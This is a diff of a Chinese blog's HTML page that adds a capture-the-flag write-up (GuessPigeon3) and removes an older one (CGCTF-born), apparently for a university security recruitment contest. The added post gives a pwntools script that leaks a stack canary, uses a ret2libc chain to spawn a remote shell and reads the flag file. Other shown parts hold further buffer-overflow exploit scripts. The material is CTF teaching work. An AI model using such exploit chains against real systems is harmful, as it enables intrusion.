@@ -199,6 +199,72 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-CNSSrecruit-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/15/CNSSrecruit-3/" class="article-date">
+      <time datetime="2018-10-15T15:05:31.000Z" itemprop="datePublished">2018-10-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/15/CNSSrecruit-3/">CNSSrecruit-3</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="GuessPigeon3"><a href="#GuessPigeon3" class="headerlink" title="GuessPigeon3"></a>GuessPigeon3</h1><p>开了canary保护，提供了libc.so文件。<br>参考文章<a href="https://blog.csdn.net/publicStr/article/details/80344321" target="_blank" rel="noopener">write函数泄露+用地址跳回重执行主函数</a></p>
+<p>guess函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int guess()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+8h] [ebp-70h]</span><br><span class="line">  unsigned int v2; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;buf, 0, 0x64u);</span><br><span class="line">  puts(&quot;You You have two chances. Please input your guess:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  printf(&quot;You guessed the pigeon number is %s .\nI&apos;m sorry, you guessed wrong.&quot;, &amp;buf);</span><br><span class="line">  puts(&quot;Please input your guess again:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  puts(&quot;You&apos;ve been fooled.There are no pigenos here!\n Good bye~&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>v2就是canary，buf存在栈溢出。</p>
+<p>ida打开libc.so.6，找到system的偏移地址。/bin/sh字符串的偏移地址可以用winhex打开libc文件查找（详见参考文章，很给力）。</p>
+<p>第一次输入后会对输入进行一次输出，可以利用这一次输出把canary带出来，在第二次输入中使用来跳过canary保护。</p>
+<p>然后第二次输入时利用栈溢出覆盖掉guess函数的返回地址，调用write函数，输出write函数的真实地址来计算libc的起始地址，就可以计算出system函数的真实地址。同时将write函数的返回地址填充为main函数的地址，这样在第二次输入完之后又会再次进入main函数。</p>
+<p>这样再次进入main函数之后，就可以开shell了。脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf1=ELF(&quot;./GuessPigeon3&quot;)</span><br><span class="line">elf2=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">plt_write=elf1.plt[&quot;write&quot;]</span><br><span class="line">got_write=elf1.got[&quot;write&quot;]</span><br><span class="line">system_libc=0x3ada0</span><br><span class="line">bin_sh_libc=0x15ba0b</span><br><span class="line"></span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">sh.recvuntil(&quot;token:&quot;)</span><br><span class="line">sh.sendline(&quot;GuessPigeon3&quot;)</span><br><span class="line">sh.recvuntil(&quot;guess:&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*95+&quot;abcde&quot;)</span><br><span class="line">sh.recvuntil(&quot;abcde&quot;)</span><br><span class="line">sh.recv(1)</span><br><span class="line">canary=&apos;\x00&apos;+sh.recv(3)</span><br><span class="line">sh.recvuntil(&quot;again:&quot;)</span><br><span class="line">payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(plt_write)+p32(0x080486c4)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line">leak=u32(sh.recv(4))</span><br><span class="line">libc_base=leak-elf2.symbols[&apos;write&apos;]</span><br><span class="line">system=libc_base+system_libc</span><br><span class="line">bin_sh=libc_base+bin_sh_libc</span><br><span class="line">sh.recvuntil(&quot;guess:&quot;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&quot;again:&quot;)</span><br><span class="line">payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(system)+p32(1)+p32(bin_sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>发现程序十秒不输入就会自行结束，所以把cat flag的操作也写进脚本吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.sendline(&quot;cd ..&quot;)</span><br><span class="line">sh.sendline(&quot;cat flag_GuessPigeon3&quot;)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>
+<h1 id="诡异的修罗铭文"><a href="#诡异的修罗铭文" class="headerlink" title="诡异的修罗铭文"></a>诡异的修罗铭文</h1>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-CNSSrecruit-2" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -763,68 +829,6 @@
 <p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>之后cat flag就可以得到flag了</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="CGCTF-when-cgctf-born" class="article article-type-CGCTF-when" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/02/cgctf-born/" class="article-date">
-      <time datetime="2018-10-02T08:37:30.000Z" itemprop="datePublished">2018-10-02</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/02/cgctf-born/">CGCTF-born</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><a href="https://cgctf.nuptsast.com/challenges#Pwn" target="_blank" rel="noopener">题目地址</a></p>
-<p>看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333</p>
-<p>打开test.c:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">struct Student &#123;</span><br><span class="line">    char name[8];</span><br><span class="line">    int birth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    setbuf(stdin, 0);</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line">    struct Student student;</span><br><span class="line">    printf(&quot;What\&apos;s Your Birth?\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;student.birth);</span><br><span class="line">    while (getchar() != &apos;\n&apos;) ;</span><br><span class="line">    if (student.birth == 1926) &#123;</span><br><span class="line">        printf(&quot;You Cannot Born In 1926!\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;What\&apos;s Your Name?\n&quot;);</span><br><span class="line">    gets(student.name);</span><br><span class="line">    printf(&quot;You Are Born In %d\n&quot;, student.birth);</span><br><span class="line">    if (student.birth == 1926) &#123;</span><br><span class="line">        printf(&quot;You Shall Have Flag.\n&quot;);</span><br><span class="line">        system(&quot;cat flag&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;You Are Naive.\n&quot;);</span><br><span class="line">        printf(&quot;You Speed One Second Here.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;*8 + p32(1926))</span><br><span class="line">sh.interactive</span><br></pre></td></tr></table></figure>
-<p><strong><em>flag get</em></strong></p>
 
       
     </div>
